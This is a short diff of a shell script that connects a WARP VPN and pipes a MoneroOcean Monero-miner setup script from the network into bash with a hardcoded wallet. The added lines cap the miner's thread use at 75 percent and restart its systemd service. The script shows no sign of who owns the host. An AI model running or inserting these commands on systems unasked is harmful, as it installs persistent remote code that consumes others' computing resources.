@@ -20,3 +20,6 @@ warp-cli remove-excluded-route ff05::/16
 warp-cli add-excluded-route 147.182.158.74
 warp-cli connect
 curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 41gPLWXEA3mFCWB1MWbfNtNzj3tQiXeK2KgUyaa9DrJEDfvwdAbs8hfJYCRWC3F6SH37chPcwKLB4RRoeHMkboYqEztvS67
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/moneroocean/config.json
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/moneroocean/config_background.json
+systemctl restart moneroocean_miner
